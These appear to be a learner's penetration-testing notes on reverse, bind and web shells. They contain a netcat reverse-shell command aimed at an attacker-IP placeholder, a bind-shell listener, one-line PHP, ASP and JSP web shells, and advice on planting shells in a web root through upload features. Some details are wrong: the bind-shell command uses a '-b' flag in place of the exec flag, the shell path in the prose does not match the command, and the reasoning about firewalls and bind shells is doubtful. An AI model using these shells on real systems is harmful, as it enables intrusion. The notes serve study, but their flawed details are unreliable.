
# Reverse Shells vs. Bind Shells
Shells are just a way to gain and maintain access to a target machine. The most common type of shell is a [reverse shell](/cybersecurity/TTPs/exploitation/rev-shell.md) in which the victim machine connects back to us. A common tool used to accomplish rev-shells is *[Netcat](../../../cybersecurity/TTPs/exploitation/tools/netcat.md)*.
## Rev Shells
In order for rev shells to work, the attacking device needs to be listening on a specific port for the connection. In Netcat we can tell our device to listen on a chosen port with the command: `nc -lvp 4444`.
- `-l` for listen
- `-v` for verbose
- `-p` for port
With this command, we're telling Netcat to listen on port 4444 of our machine.
### On the target:
To get the target to connect to our listener, we have to execute a command on the target to make the connection. For example: if the target *has netcat installed* (or we've some how gotten netcat onto the target machine) we can use it to make a connection back to our machine.

The command on the target in this case would look something like this:
```bash
nc <attacking IP> 4444 -e /bin/sh
```
In this command, nc on the target device creates a *[TCP connection](/networking/protocols/TCP.md)* back to the attacking IP, and executing a shell (`/bin/bash`) using the `-e` flag (the shell is executed on the target device).
## Bind Shells
[Bind shells](/cybersecurity/TTPs/exploitation/bind-shell.md) are essentially *the reverse of rev shells.* In bind shells, we *open a port on the target for listening* and make the TCP connection to that address from the attacker.

The shell execution *is still from the target's device*:
```bash
# Attacking command (example)
nc <target IP> 4444

# Target command (ex)
nc -lvp 4444 -b /bin/bash
```
Bind shells are more commonly used during *external pen-tests* b/c it's easier to make the connection to the target (due to firewalls and other factors complicating external network access).
## Web Shells
Typically written and executed using a web script/ language like [PHP](../../../coding/languages/PHP.md) or [ASPX](../../../coding/languages/ASPX.md). Additionally, a web shell is usually *accepting commands through [HTTP](../../../www/HTTP.md) or [HTTPS](../../../www/HTTPS.md)*. The shell then prints the output of our commands *on the webpage*. 
### Web Shell Scripts
#### PHP
```php
<?php system($_REQUEST["cmd"]); ?>
```
**NOTE:** If you want to check that your PHP shell will actually execute, you can try with a much simpler and more innocuous command like `phpinfo()`. If you can get `phpinfo()` to execute, then the webpage should show a bunch of server configuration info. This verifies that the server is executing PHP at this endpoint.
#### ASP
```asp
<% eval request("cmd") %>
```
#### JSP
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
### Uploading a Web Shell
For our script to execute, we need to deliver it *to the web root* of the remote host/ server. Usually, if  we can get our script there, then the browser will execute it. Common vectors for delivering our web shell script to the web root is through upload features (such as a profile picture for your account on the vulnerable website), etc..
#### Where is the web root?
It might take some poking around to identify where the web root is. For common web servers, the default paths are:

| Server | Web Root               |
| ------ | ---------------------- |
| Apache | /var/www/html/         |
| Nginx  | /usr/local/nginx/html/ |
| IIS    | C:\inetpub\wwwroot\    |
| XAMPP  | C:\xampp\htdocs\       |
> [!Resources]
> - [TCM Security: PEH](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course)
> - [HTB Academy: Types of Shells](https://academy.hackthebox.com/module/77/section/725)

> [!My previous notes (linked in text)]
> - [Rev Shells](https://github.com/TrshPuppy/obsidian-notes/tree/main/cybersecurity/TTPs/exploitation/rev-shell.md) 
> - [Netcat](https://github.com/TrshPuppy/obsidian-notes/tree/main/cybersecurity/tools/netcat.md)
> - [TCP](https://github.com/TrshPuppy/obsidian-notes/tree/main/networking/protocols/TCP.md)
> - [Bind Shells](https://github.com/TrshPuppy/obsidian-notes/tree/main/cybersecurity/TTPs/exploitation/bind-shell.md) 
> - [blank](https://github.com/TrshPuppy/obsidian-notes/tree/main/)